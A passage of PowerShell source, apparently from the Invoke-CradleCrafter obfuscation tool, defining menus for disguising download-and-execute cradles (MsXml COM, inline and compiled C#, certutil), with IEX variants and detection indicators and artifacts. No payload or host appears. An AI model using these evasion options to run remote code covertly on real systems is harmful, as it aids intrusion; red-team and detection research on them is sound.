    $MenuLevel_Memory_PsComIE_Invoke             += , @($LineSpacing, '6'  , "  PS1.0 Invoke      --> <`$ExecutionContext>..."             , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Memory_PsComIE_Invoke             += , @($LineSpacing, '7'  , "  ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"      , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Memory_PsComIE_Invoke             += , @($LineSpacing, '8'  , "  PS Runspace       --> <[PowerShell]::Create()> (StdOut)"   , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Memory_PsComIE_Invoke             += , @($LineSpacing, '9'  , "  Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>"  , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Memory_PsComIE_Invoke             += , @($LineSpacing, '10' , "  Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"        , @('Out-Cradle', $CradleType, 'Invoke', 10))

    $MenuLevel_Memory_PsComIE_All                 =   @()
    $MenuLevel_Memory_PsComIE_All                += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Memory_PsComMsXml                =   @()
    $MenuContext_Memory_PsComMsXml               += , @('Name         ','PsComMsXml')
    $MenuContext_Memory_PsComMsXml               += , @('Description  ','PowerShell leveraging MsXml2.ServerXmlHttp via COM Object interactions')
    $MenuContext_Memory_PsComMsXml               += , @('Compatibility','PS 2.0+')
    $MenuContext_Memory_PsComMsXml               += , @('Dependencies ','N/A')
    $MenuContext_Memory_PsComMsXml               += , @('Footprint    ','Entirely memory-based')
    $MenuContext_Memory_PsComMsXml               += , @('Indicators   ',@('powershell.exe loads C:\Windows\System32\rasman.dll','powershell.exe loads C:\Windows\System32\rasapi32.dll'))
    $MenuContext_Memory_PsComMsXml               += , @('Artifacts    ',@('C:\Windows\Prefetch\POWERSHELL.EXE-********.pf','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASMANCS','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASAPI32'))
    $MenuContext_Memory_PsComMsXml               += , @('User-Agent   ','Mozilla/* (compatible; Win32; WinHttp.WinHttpRequest.*')

    $CradleType = 14

    $MenuLevel_Memory_PsComMsXml                  =   @()
    $MenuLevel_Memory_PsComMsXml                 += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Memory_PsComMsXml                 += , @($LineSpacing, 'Cmdlet   ' , '<New-Object>')
    $MenuLevel_Memory_PsComMsXml                 += , @($LineSpacing, 'Method   ' , '<Open>')
    $MenuLevel_Memory_PsComMsXml                 += , @($LineSpacing, 'Method2  ' , '<Send>')
    $MenuLevel_Memory_PsComMsXml                 += , @($LineSpacing, 'Flag     ' , '<-C[omObject]> (flag substring)')
    $MenuLevel_Memory_PsComMsXml                 += , @($LineSpacing, 'Property ' , '<ResponseText>')
    $MenuLevel_Memory_PsComMsXml                 += , @($LineSpacing, 'Boolean  ' , '<$False>')
    $MenuLevel_Memory_PsComMsXml                 += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Memory_PsComMsXml                 += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')
    
    $MenuLevel_Memory_PsComMsXml_Rearrange        =   @()
    $MenuLevel_Memory_PsComMsXml_Rearrange       += , @($LineSpacing, '1' , "Default         --> <Default> syntax arrangement"             , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Memory_PsComMsXml_Rearrange       += , @($LineSpacing, '2' , "Multi-Variable  --> <Logical> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 2))
    
    $MenuLevel_Memory_PsComMsXml_Cmdlet           =   @()
    $MenuLevel_Memory_PsComMsXml_Cmdlet          += , @($LineSpacing, '1' , "PS New-Object    --> <New-Object>"                            , @('Out-Cradle', $CradleType, 'NewObject', 1))
    $MenuLevel_Memory_PsComMsXml_Cmdlet          += , @($LineSpacing, '2' , "PS Get-Command   --> <Get-Command>/<GCM>"                     , @('Out-Cradle', $CradleType, 'NewObject', 2))
    $MenuLevel_Memory_PsComMsXml_Cmdlet          += , @($LineSpacing, '3' , "PS1.0 GetCmdlets --> <`$ExecutionContext...>"                 , @('Out-Cradle', $CradleType, 'NewObject', 3))
    
    $MenuLevel_Memory_PsComMsXml_Method           =   @()
    $MenuLevel_Memory_PsComMsXml_Method          += , @($LineSpacing, '1' , "Open           --> <Open>"                                    , @('Out-Cradle', $CradleType, 'Open2', 1))
    $MenuLevel_Memory_PsComMsXml_Method          += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'Open2', 2))
    
    $MenuLevel_Memory_PsComMsXml_Method2          =   @()
    $MenuLevel_Memory_PsComMsXml_Method2         += , @($LineSpacing, '1' , "Send           --> <Send>"                                    , @('Out-Cradle', $CradleType, 'Send', 1))
    $MenuLevel_Memory_PsComMsXml_Method2         += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'Send', 2))
    
    $MenuLevel_Memory_PsComMsXml_Flag             =   @()
    $MenuLevel_Memory_PsComMsXml_Flag            += , @($LineSpacing, '1' , "Full Flag      --> <-ComObject>"                              , @('Out-Cradle', $CradleType, 'ComObjectFlag', 1))
    $MenuLevel_Memory_PsComMsXml_Flag            += , @($LineSpacing, '2' , "Flag Substring --> <-C[omObject]>"                            , @('Out-Cradle', $CradleType, 'ComObjectFlag', 2))
    
    $MenuLevel_Memory_PsComMsXml_Property         =   @()
    $MenuLevel_Memory_PsComMsXml_Property        += , @($LineSpacing, '1' , "ResponseText  --> <ResponseText>"                             , @('Out-Cradle', $CradleType, 'ResponseText', 1))
    $MenuLevel_Memory_PsComMsXml_Property        += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'ResponseText', 2))
    
    $MenuLevel_Memory_PsComMsXml_Boolean          =   @()
    $MenuLevel_Memory_PsComMsXml_Boolean         += , @($LineSpacing, '1' , "Default         --> <`$False>"                                , @('Out-Cradle', $CradleType, 'BooleanFalse', 1))
    $MenuLevel_Memory_PsComMsXml_Boolean         += , @($LineSpacing, '2' , "Integer         --> <0>"                                      , @('Out-Cradle', $CradleType, 'BooleanFalse', 2))
    $MenuLevel_Memory_PsComMsXml_Boolean         += , @($LineSpacing, '3' , "PS Get-Variable --> (<GV F*se>).Value"                        , @('Out-Cradle', $CradleType, 'BooleanFalse', 3))
    
    $MenuLevel_Memory_PsComMsXml_Invoke           =   @()
    $MenuLevel_Memory_PsComMsXml_Invoke          += , @($LineSpacing, '1'  , "   No Invoke         --> For <testing> download sans IEX"    , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Memory_PsComMsXml_Invoke          += , @($LineSpacing, '2'  , "   PS IEX            --> <IEX/Invoke-Expression>"            , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Memory_PsComMsXml_Invoke          += , @($LineSpacing, '3'  , "   PS Get-Alias      --> <Get-Alias>/<GAL>"                  , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Memory_PsComMsXml_Invoke          += , @($LineSpacing, '4'  , "   PS Get-Command    --> <Get-Command>/<GCM>"                , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Memory_PsComMsXml_Invoke          += , @($LineSpacing, '5'  , "   PS1.0 GetCmdlet   --> <`$ExecutionContext>..."            , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Memory_PsComMsXml_Invoke          += , @($LineSpacing, '6'  , "   PS1.0 Invoke      --> <`$ExecutionContext>..."            , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Memory_PsComMsXml_Invoke          += , @($LineSpacing, '7'  , "   ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"     , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Memory_PsComMsXml_Invoke          += , @($LineSpacing, '8'  , "   PS Runspace       --> <[PowerShell]::Create()> (StdOut)"  , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Memory_PsComMsXml_Invoke          += , @($LineSpacing, '9'  , "   Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>" , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Memory_PsComMsXml_Invoke          += , @($LineSpacing, '10' , "   Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"       , @('Out-Cradle', $CradleType, 'Invoke', 10))

    $MenuLevel_Memory_PsComMsXml_All              =   @()
    $MenuLevel_Memory_PsComMsXml_All             += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Memory_PsInlineCSharp            =   @()
    $MenuContext_Memory_PsInlineCSharp           += , @('Name         ','PsInlineCSharp')
    $MenuContext_Memory_PsInlineCSharp           += , @('Description  ','Inline CSharp compiled on target via Add-Type')
    $MenuContext_Memory_PsInlineCSharp           += , @('Compatibility','PS 2.0+')
    $MenuContext_Memory_PsInlineCSharp           += , @('Dependencies ','csc.exe on target for compiling inline CSharp before executing')
    $MenuContext_Memory_PsInlineCSharp           += , @('Footprint    ',@('Net.WebClient downloadstring method used but does not show up in PS logs','Optional CSharp PS Runspace invocation option available'))
    $MenuContext_Memory_PsInlineCSharp           += , @('Indicators   ',@('powershell.exe spawns csc.exe which spawns cvtres.exe','Temporary CSharp compilation files (.cs, .cmdline, etc.)','powershell.exe loads C:\Windows\System32\rasman.dll','powershell.exe loads C:\Windows\System32\rasapi32.dll'))
    $MenuContext_Memory_PsInlineCSharp           += , @('Artifacts    ',@('AppCompat Cache','C:\Windows\Prefetch\POWERSHELL.EXE-********.pf','C:\Windows\Prefetch\POWERSHELL.EXE-********.pf','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASMANCS','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASAPI32'))
    $MenuContext_Memory_PsInlineCSharp           += , @('User-Agent   ',@('None','UA generally trivial to change'))
    $MenuContext_Memory_PsInlineCSharp           += , @('Note         ','Invoked in Start-Job in Invoke-CradleCrafter since running Add-Type on same class name but updated content will fail in current powershell instance')

    $CradleType = 15

    $MenuLevel_Memory_PsInlineCSharp              =   @()
    $MenuLevel_Memory_PsInlineCSharp             += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Memory_PsInlineCSharp             += , @($LineSpacing, 'Cmdlet   ' , '<Add-Type>')
    $MenuLevel_Memory_PsInlineCSharp             += , @($LineSpacing, 'Flag     ' , '<-La[nguage]> (flag substring)')
    $MenuLevel_Memory_PsInlineCSharp             += , @($LineSpacing, 'Class    ' , '<System.Net>')
    $MenuLevel_Memory_PsInlineCSharp             += , @($LineSpacing, 'Class2   ' , '<Runspace>')
    $MenuLevel_Memory_PsInlineCSharp             += , @($LineSpacing, 'Class3   ' , '<Runspace.Automation>')
    $MenuLevel_Memory_PsInlineCSharp             += , @($LineSpacing, 'Method   ' , '[<Class>]::<Method>')
    $MenuLevel_Memory_PsInlineCSharp             += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Memory_PsInlineCSharp             += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')
    
    $MenuLevel_Memory_PsInlineCSharp_Rearrange    =   @()
    $MenuLevel_Memory_PsInlineCSharp_Rearrange   += , @($LineSpacing, '1' , "Default          --> <Default> syntax arrangement"            , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Memory_PsInlineCSharp_Rearrange   += , @($LineSpacing, '2' , "Multi-Variable   --> <Logical> variable names and syntax"     , @('Out-Cradle', $CradleType, 'Rearrange', 2))
    $MenuLevel_Memory_PsInlineCSharp_Rearrange   += , @($LineSpacing, '3' , "Random-Variable  --> <Random> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 3))
    
    $MenuLevel_Memory_PsInlineCSharp_Cmdlet       =   @()
    $MenuLevel_Memory_PsInlineCSharp_Cmdlet      += , @($LineSpacing, '1' , "PS Add-Type      --> <Add-Type>"                              , @('Out-Cradle', $CradleType, 'AddType', 1))
    $MenuLevel_Memory_PsInlineCSharp_Cmdlet      += , @($LineSpacing, '2' , "PS Get-Command   --> <Get-Command>/<GCM>"                     , @('Out-Cradle', $CradleType, 'AddType', 2))
    $MenuLevel_Memory_PsInlineCSharp_Cmdlet      += , @($LineSpacing, '3' , "PS1.0 GetCmdlets --> <`$ExecutionContext...>"                 , @('Out-Cradle', $CradleType, 'AddType', 3))
    
    $MenuLevel_Memory_PsInlineCSharp_Flag         =   @()
    $MenuLevel_Memory_PsInlineCSharp_Flag        += , @($LineSpacing, '1' , "No Flag        --> <No Flag> - CSharp Is Default Language"    , @('Out-Cradle', $CradleType, 'LanguageCSharp', 1))
    $MenuLevel_Memory_PsInlineCSharp_Flag        += , @($LineSpacing, '2' , "Full Flag      --> <-Language>"                               , @('Out-Cradle', $CradleType, 'LanguageCSharp', 2))
    $MenuLevel_Memory_PsInlineCSharp_Flag        += , @($LineSpacing, '3' , "Flag Substring --> <-La[nguage]>"                             , @('Out-Cradle', $CradleType, 'LanguageCSharp', 3))
    
    $MenuLevel_Memory_PsInlineCSharp_Class        =   @() 
    $MenuLevel_Memory_PsInlineCSharp_Class       += , @($LineSpacing, '1' , "Using  --> using <System.Net>;"                               , @('Out-Cradle', $CradleType, 'SystemNet', 1))
    $MenuLevel_Memory_PsInlineCSharp_Class       += , @($LineSpacing, '2' , "Inline --> <System.Net>.*"                                    , @('Out-Cradle', $CradleType, 'SystemNet', 2))
    $MenuLevel_Memory_PsInlineCSharp_Class       += , @($LineSpacing, '3' , "Random --> <Using>/<Inline>"                                  , @('Out-Cradle', $CradleType, 'SystemNet', 3))
    
    $MenuLevel_Memory_PsInlineCSharp_Class2       =   @()
    $MenuLevel_Memory_PsInlineCSharp_Class2      += , @($LineSpacing, '1' , "Using  --> using ...<Automation>;"                            , @('Out-Cradle', $CradleType, 'Automation', 1))
    $MenuLevel_Memory_PsInlineCSharp_Class2      += , @($LineSpacing, '2' , "Inline --> ...<Automation>.*"                                 , @('Out-Cradle', $CradleType, 'Automation', 2))
    $MenuLevel_Memory_PsInlineCSharp_Class2      += , @($LineSpacing, '3' , "Random --> <Using>/<Inline>"                                  , @('Out-Cradle', $CradleType, 'Automation', 3))
    
    $MenuLevel_Memory_PsInlineCSharp_Class3       =   @()
    $MenuLevel_Memory_PsInlineCSharp_Class3      += , @($LineSpacing, '1' , "Using  --> using ...<Automation.Runspaces>;"                  , @('Out-Cradle', $CradleType, 'AutomationRunspaces', 1))
    $MenuLevel_Memory_PsInlineCSharp_Class3      += , @($LineSpacing, '2' , "Inline --> ...<Automation.Runspaces>.*"                       , @('Out-Cradle', $CradleType, 'AutomationRunspaces', 2))
    $MenuLevel_Memory_PsInlineCSharp_Class3      += , @($LineSpacing, '3' , "Random --> <Using>/<Inline>"                                  , @('Out-Cradle', $CradleType, 'AutomationRunspaces', 3))
    
    $MenuLevel_Memory_PsInlineCSharp_Method       =   @()
    $MenuLevel_Memory_PsInlineCSharp_Method      += , @($LineSpacing, '1' , "Default --> <Default> Class & Method Name"                    , @('Out-Cradle', $CradleType, 'ClassAndMethod', 1))
    $MenuLevel_Memory_PsInlineCSharp_Method      += , @($LineSpacing, '2' , "Normal  --> <Normal> Class & Method Names"                    , @('Out-Cradle', $CradleType, 'ClassAndMethod', 2))
    $MenuLevel_Memory_PsInlineCSharp_Method      += , @($LineSpacing, '3' , "Random  --> <Random> Class & Method Names"                    , @('Out-Cradle', $CradleType, 'ClassAndMethod', 3))
    
    $MenuLevel_Memory_PsInlineCSharp_Invoke       =   @()
    $MenuLevel_Memory_PsInlineCSharp_Invoke      += , @($LineSpacing, '1'  , "   No Invoke         --> For <testing> download sans IEX"    , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Memory_PsInlineCSharp_Invoke      += , @($LineSpacing, '2'  , "   PS IEX            --> <IEX/Invoke-Expression>"            , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Memory_PsInlineCSharp_Invoke      += , @($LineSpacing, '3'  , "   PS Get-Alias      --> <Get-Alias>/<GAL>"                  , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Memory_PsInlineCSharp_Invoke      += , @($LineSpacing, '4'  , "   PS Get-Command    --> <Get-Command>/<GCM>"                , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Memory_PsInlineCSharp_Invoke      += , @($LineSpacing, '5'  , "   PS1.0 GetCmdlet   --> <`$ExecutionContext>..."            , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Memory_PsInlineCSharp_Invoke      += , @($LineSpacing, '6'  , "   PS1.0 Invoke      --> <`$ExecutionContext>..."            , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Memory_PsInlineCSharp_Invoke      += , @($LineSpacing, '7'  , "   ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"     , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Memory_PsInlineCSharp_Invoke      += , @($LineSpacing, '8'  , "   PS Runspace       --> <[PowerShell]::Create()> (StdOut)"  , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Memory_PsInlineCSharp_Invoke      += , @($LineSpacing, '9'  , "   Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>" , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Memory_PsInlineCSharp_Invoke      += , @($LineSpacing, '10' , "   Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"       , @('Out-Cradle', $CradleType, 'Invoke', 10))
    $MenuLevel_Memory_PsInlineCSharp_Invoke      += , @($LineSpacing, '11' , "   PS Runspace 2     --> <PS Runspace> in script (StdOut)"   , @('Out-Cradle', $CradleType, 'Invoke', 11))

    $MenuLevel_Memory_PsInlineCSharp_All          =   @()
    $MenuLevel_Memory_PsInlineCSharp_All         += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Memory_PsCompiledCSharp          =   @()
    $MenuContext_Memory_PsCompiledCSharp         += , @('Name         ','PsCompiledCSharp')
    $MenuContext_Memory_PsCompiledCSharp         += , @('Description  ','Pre-Compiled CSharp loaded into memory via [Reflection.Assembly]::Load')
    $MenuContext_Memory_PsCompiledCSharp         += , @('Compatibility','PS 2.0+')
    $MenuContext_Memory_PsCompiledCSharp         += , @('Dependencies ','N/A')
    $MenuContext_Memory_PsCompiledCSharp         += , @('Footprint    ','Entirely memory-based.')
    $MenuContext_Memory_PsCompiledCSharp         += , @('Indicators   ',@('powershell.exe loads C:\Windows\System32\rasman.dll','powershell.exe loads C:\Windows\System32\rasapi32.dll'))
    $MenuContext_Memory_PsCompiledCSharp         += , @('Artifacts    ',@('C:\Windows\Prefetch\POWERSHELL.EXE-********.pf','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASMANCS','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASAPI32'))
    $MenuContext_Memory_PsCompiledCSharp         += , @('User-Agent   ',@('None','UA generally trivial to change'))
    $MenuContext_Memory_PsCompiledCSharp         += , @('Note         ','invoked in Start-Job in Invoke-CradleCrafter since running Add-Type on same class name but updated content will fail in current powershell instance')

    $CradleType = 16

    $MenuLevel_Memory_PsCompiledCSharp            =   @()
    $MenuLevel_Memory_PsCompiledCSharp           += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Memory_PsCompiledCSharp           += , @($LineSpacing, 'Class    ' , '<System.Net>')
    $MenuLevel_Memory_PsCompiledCSharp           += , @($LineSpacing, 'Class2   ' , '<Runspace>')
    $MenuLevel_Memory_PsCompiledCSharp           += , @($LineSpacing, 'Class3   ' , '<Runspace.Automation>')
    $MenuLevel_Memory_PsCompiledCSharp           += , @($LineSpacing, 'Class4   ' , '[<Reflection.Assembly>]')
    $MenuLevel_Memory_PsCompiledCSharp           += , @($LineSpacing, 'Method   ' , '[<Class>]::<Method>')
    $MenuLevel_Memory_PsCompiledCSharp           += , @($LineSpacing, 'Method2  ' , '<Load>')
    $MenuLevel_Memory_PsCompiledCSharp           += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Memory_PsCompiledCSharp           += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')
    
    $MenuLevel_Memory_PsCompiledCSharp_Rearrange  =   @()
    $MenuLevel_Memory_PsCompiledCSharp_Rearrange += , @($LineSpacing, '1' , "Default          --> <Default> syntax arrangement"            , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Memory_PsCompiledCSharp_Rearrange += , @($LineSpacing, '2' , "Multi-Variable   --> <Logical> variable names and syntax"     , @('Out-Cradle', $CradleType, 'Rearrange', 2))
    $MenuLevel_Memory_PsCompiledCSharp_Rearrange += , @($LineSpacing, '3' , "Random-Variable  --> <Random> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 3))
    
    $MenuLevel_Memory_PsCompiledCSharp_Class      =   @() 
    $MenuLevel_Memory_PsCompiledCSharp_Class     += , @($LineSpacing, '1' , "Using  --> using <System.Net>;"                               , @('Out-Cradle', $CradleType, 'SystemNet', 1))
    $MenuLevel_Memory_PsCompiledCSharp_Class     += , @($LineSpacing, '2' , "Inline --> <System.Net>.*"                                    , @('Out-Cradle', $CradleType, 'SystemNet', 2))
    $MenuLevel_Memory_PsCompiledCSharp_Class     += , @($LineSpacing, '3' , "Random --> <Using>/<Inline>"                                  , @('Out-Cradle', $CradleType, 'SystemNet', 3))
    
    $MenuLevel_Memory_PsCompiledCSharp_Class2     =   @()
    $MenuLevel_Memory_PsCompiledCSharp_Class2    += , @($LineSpacing, '1' , "Using  --> using ...<Automation>;"                            , @('Out-Cradle', $CradleType, 'Automation', 1))
    $MenuLevel_Memory_PsCompiledCSharp_Class2    += , @($LineSpacing, '2' , "Inline --> ...<Automation>.*"                                 , @('Out-Cradle', $CradleType, 'Automation', 2))
    $MenuLevel_Memory_PsCompiledCSharp_Class2    += , @($LineSpacing, '3' , "Random --> <Using>/<Inline>"                                  , @('Out-Cradle', $CradleType, 'Automation', 3))
    
    $MenuLevel_Memory_PsCompiledCSharp_Class3     =   @()
    $MenuLevel_Memory_PsCompiledCSharp_Class3    += , @($LineSpacing, '1' , "Using  --> using ...<Automation.Runspaces>;"                  , @('Out-Cradle', $CradleType, 'AutomationRunspaces', 1))
    $MenuLevel_Memory_PsCompiledCSharp_Class3    += , @($LineSpacing, '2' , "Inline --> ...<Automation.Runspaces>.*"                       , @('Out-Cradle', $CradleType, 'AutomationRunspaces', 2))
    $MenuLevel_Memory_PsCompiledCSharp_Class3    += , @($LineSpacing, '3' , "Random --> <Using>/<Inline>"                                  , @('Out-Cradle', $CradleType, 'AutomationRunspaces', 3))

    $MenuLevel_Memory_PsCompiledCSharp_Class4     =   @()
    $MenuLevel_Memory_PsCompiledCSharp_Class4    += , @($LineSpacing, '1' , "Default   --> <[Void][System.Reflection>..."                  , @('Out-Cradle', $CradleType, 'ReflectionAssembly', 1))
    $MenuLevel_Memory_PsCompiledCSharp_Class4    += , @($LineSpacing, '2' , "Random    --> (<[Void]/`$Null=>)<[Reflection>..."             , @('Out-Cradle', $CradleType, 'ReflectionAssembly', 2))

    $MenuLevel_Memory_PsCompiledCSharp_Method     =   @()
    $MenuLevel_Memory_PsCompiledCSharp_Method    += , @($LineSpacing, '1' , "Default --> <Default> Class & Method Name"                    , @('Out-Cradle', $CradleType, 'ClassAndMethod', 1))
    $MenuLevel_Memory_PsCompiledCSharp_Method    += , @($LineSpacing, '2' , "Normal  --> <Normal> Class & Method Names"                    , @('Out-Cradle', $CradleType, 'ClassAndMethod', 2))
    $MenuLevel_Memory_PsCompiledCSharp_Method    += , @($LineSpacing, '3' , "Random  --> <Random> Class & Method Names"                    , @('Out-Cradle', $CradleType, 'ClassAndMethod', 3))
    
    $MenuLevel_Memory_PsCompiledCSharp_Method2    =   @()
    $MenuLevel_Memory_PsCompiledCSharp_Method2   += , @($LineSpacing, '1' , "PS Load       --> <Load>"                                     , @('Out-Cradle', $CradleType, 'Load', 1))
    $MenuLevel_Memory_PsCompiledCSharp_Method2   += , @($LineSpacing, '2' , "PS Get-Member --> <| Get-Member>"                             , @('Out-Cradle', $CradleType, 'Load', 2))

    $MenuLevel_Memory_PsCompiledCSharp_Invoke     =   @()
    $MenuLevel_Memory_PsCompiledCSharp_Invoke    += , @($LineSpacing, '1'  , "   No Invoke         --> For <testing> download sans IEX"    , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Memory_PsCompiledCSharp_Invoke    += , @($LineSpacing, '2'  , "   PS IEX            --> <IEX/Invoke-Expression>"            , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Memory_PsCompiledCSharp_Invoke    += , @($LineSpacing, '3'  , "   PS Get-Alias      --> <Get-Alias>/<GAL>"                  , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Memory_PsCompiledCSharp_Invoke    += , @($LineSpacing, '4'  , "   PS Get-Command    --> <Get-Command>/<GCM>"                , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Memory_PsCompiledCSharp_Invoke    += , @($LineSpacing, '5'  , "   PS1.0 GetCmdlet   --> <`$ExecutionContext>..."            , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Memory_PsCompiledCSharp_Invoke    += , @($LineSpacing, '6'  , "   PS1.0 Invoke      --> <`$ExecutionContext>..."            , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Memory_PsCompiledCSharp_Invoke    += , @($LineSpacing, '7'  , "   ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"     , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Memory_PsCompiledCSharp_Invoke    += , @($LineSpacing, '8'  , "   PS Runspace       --> <[PowerShell]::Create()> (StdOut)"  , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Memory_PsCompiledCSharp_Invoke    += , @($LineSpacing, '9'  , "   Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>" , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Memory_PsCompiledCSharp_Invoke    += , @($LineSpacing, '10' , "   Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"       , @('Out-Cradle', $CradleType, 'Invoke', 10))
    $MenuLevel_Memory_PsCompiledCSharp_Invoke    += , @($LineSpacing, '11' , "   PS Runspace 2     --> <PS Runspace> in script (StdOut)"   , @('Out-Cradle', $CradleType, 'Invoke', 11))

    $MenuLevel_Memory_PsCompiledCSharp_All        =   @()
    $MenuLevel_Memory_PsCompiledCSharp_All       += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Memory_Certutil                  =   @()
    $MenuContext_Memory_Certutil                 += , @('Name         ','Certutil')
    $MenuContext_Memory_Certutil                 += , @('Description  ','PowerShell leveraging certutil.exe to download payload as string')
    $MenuContext_Memory_Certutil                 += , @('Compatibility','PS 2.0+')
    $MenuContext_Memory_Certutil                 += , @('Dependencies ','Certutil.exe')
    $MenuContext_Memory_Certutil                 += , @('Footprint    ','Entirely memory-based')
    $MenuContext_Memory_Certutil                 += , @('Indicators   ',@('powershell.exe spawns certutil.exe','certutil.exe makes network connection instead of powershell.exe'))
    $MenuContext_Memory_Certutil                 += , @('Artifacts    ',@('C:\Windows\Prefetch\CERTUTIL.EXE-********.pf','AppCompat Cache'))
    
    $CradleType = 17
        
    $MenuLevel_Memory_Certutil                    =   @()
    $MenuLevel_Memory_Certutil                   += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Memory_Certutil                   += , @($LineSpacing, 'Cmdlet   ' , '<Select-Object>')
    $MenuLevel_Memory_Certutil                   += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Memory_Certutil                   += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')

    $MenuLevel_Memory_Certutil_Rearrange          =   @()
    $MenuLevel_Memory_Certutil_Rearrange         += , @($LineSpacing, '1' , "Default         --> <Default> syntax arrangement"             , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Memory_Certutil_Rearrange         += , @($LineSpacing, '2' , "Multi-Variable  --> <Logical> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 2))
    $MenuLevel_Memory_Certutil_Rearrange         += , @($LineSpacing, '3' , "Random-Variable --> <Random> variable names and syntax"       , @('Out-Cradle', $CradleType, 'Rearrange', 3))

    $MenuLevel_Memory_Certutil_Cmdlet             =   @()
    $MenuLevel_Memory_Certutil_Cmdlet            += , @($LineSpacing, '1' , "PS Select-Object --> <Select-Object>"                         , @('Out-Cradle', $CradleType, 'SelectObject', 1))
